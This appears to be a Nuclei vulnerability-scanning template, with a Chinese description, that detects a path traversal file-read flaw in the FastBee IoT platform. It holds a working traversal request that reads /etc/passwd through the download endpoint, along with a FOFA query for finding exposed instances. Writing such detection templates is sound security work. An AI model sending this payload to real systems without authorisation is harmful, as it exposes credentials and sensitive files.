id: fastbee-arbitrary-file-read

info:
  name: FastBee - 本地文件包含漏洞
  author: s4e-io
  severity: high
  description: |
    该模板用于检测 FastBee - 本地文件包含漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/`、`/prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://blog.csdn.net/weixin_43167326/article/details/141806542
  metadata:
    verified: true
    max-request: 1
    vendor: fastbee
    product: fastbee
    fofa-query: "fastbee"
  tags: fastbee,iot,lfi,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"<title>FastBee")'
          - 'status_code == 200'
        condition: and
        internal: true

  - raw:
      - |
        GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"

      - type: word
        part: content_type
        words:
          - 'application/octet-stream'

      - type: status
        status:
          - 200
